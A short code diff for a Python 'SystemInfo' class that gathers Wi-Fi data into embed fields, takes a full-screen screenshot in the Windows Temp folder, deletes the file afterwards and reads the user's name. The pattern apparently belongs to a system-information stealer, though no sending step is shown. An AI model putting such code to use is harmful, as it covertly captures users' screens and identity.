@@ -43,6 +43,8 @@ class SystemInfo():
             inline=self.wifi_data()[2]
         )
 
+        self.path = os.getcwd()
+        os.chdir('C:/Windows/Temp')
         image = ImageGrab.grab(
             bbox=None,
             include_layered_windows=False,
@@ -64,7 +66,9 @@ class SystemInfo():
 
         if os.path.exists("screenshot.png"):
             os.remove("screenshot.png")
-
+            
+        os.chdir(self.path)
+            
     def user_data(self) -> tuple[str, str, bool]:
         def display_name() -> str:
             GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
